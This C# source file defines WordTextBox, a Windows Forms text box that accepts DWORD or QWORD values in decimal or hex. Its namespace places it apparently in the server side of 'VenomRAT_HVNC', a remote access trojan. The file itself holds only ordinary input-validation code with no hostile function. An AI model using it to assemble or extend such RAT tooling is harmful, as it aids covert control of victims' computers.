using System;
using System.ComponentModel;
using System.Globalization;
using System.Windows.Forms;

namespace VenomRAT_HVNC.Server.Helper
{
    public class WordTextBox : TextBox
    {
        public override int MaxLength
        {
            get
            {
                return base.MaxLength;
            }
            set
            {
            }
        }

        public bool IsHexNumber
        {
            get
            {
                return this.isHexNumber;
            }
            set
            {
                if (this.isHexNumber == value)
                {
                    return;
                }
                if (value)
                {
                    if (this.Type == WordTextBox.WordType.DWORD)
                    {
                        this.Text = this.UIntValue.ToString("x");
                    }
                    else
                    {
                        this.Text = this.ULongValue.ToString("x");
                    }
                }
                else if (this.Type == WordTextBox.WordType.DWORD)
                {
                    this.Text = this.UIntValue.ToString();
                }
                else
                {
                    this.Text = this.ULongValue.ToString();
                }
                this.isHexNumber = value;
                this.UpdateMaxLength();
            }
        }

        public WordTextBox.WordType Type
        {
            get
            {
                return this.type;
            }
            set
            {
                if (this.type == value)
                {
                    return;
                }
                this.type = value;
                this.UpdateMaxLength();
            }
        }

        public uint UIntValue
        {
            get
            {
                uint result;
                try
                {
                    if (string.IsNullOrEmpty(this.Text))
                    {
                        result = 0U;
                    }
                    else if (this.IsHexNumber)
                    {
                        result = uint.Parse(this.Text, NumberStyles.HexNumber);
                    }
                    else
                    {
                        result = uint.Parse(this.Text);
                    }
                }
                catch (Exception)
                {
                    result = uint.MaxValue;
                }
                return result;
            }
        }

        public ulong ULongValue
        {
            get
            {
                ulong result;
                try
                {
                    if (string.IsNullOrEmpty(this.Text))
                    {
                        result = 0UL;
                    }
                    else if (this.IsHexNumber)
                    {
                        result = ulong.Parse(this.Text, NumberStyles.HexNumber);
                    }
                    else
                    {
                        result = ulong.Parse(this.Text);
                    }
                }
                catch (Exception)
                {
                    result = ulong.MaxValue;
                }
                return result;
            }
        }

        public bool IsConversionValid()
        {
            return string.IsNullOrEmpty(this.Text) || this.IsHexNumber || this.ConvertToHex();
        }

        public WordTextBox()
        {
            this.InitializeComponent();
            base.MaxLength = 8;
        }

        protected override void OnKeyPress(KeyPressEventArgs e)
        {
            base.OnKeyPress(e);
            e.Handled = !this.IsValidChar(e.KeyChar);
        }

        private bool IsValidChar(char ch)
        {
            return char.IsControl(ch) || char.IsDigit(ch) || (this.IsHexNumber && char.IsLetter(ch) && char.ToLower(ch) <= 'f');
        }

        private void UpdateMaxLength()
        {
            if (this.Type == WordTextBox.WordType.DWORD)
            {
                if (this.IsHexNumber)
                {
                    base.MaxLength = 8;
                    return;
                }
                base.MaxLength = 10;
                return;
            }
            else
            {
                if (this.IsHexNumber)
                {
                    base.MaxLength = 16;
                    return;
                }
                base.MaxLength = 20;
                return;
            }
        }

        private bool ConvertToHex()
        {
            bool result;
            try
            {
                if (this.Type == WordTextBox.WordType.DWORD)
                {
                    uint.Parse(this.Text);
                }
                else
                {
                    ulong.Parse(this.Text);
                }
                result = true;
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
        }

        private bool isHexNumber;

        private WordTextBox.WordType type;

        private IContainer components;

        public enum WordType
        {
            DWORD,

            QWORD
        }
    }
}
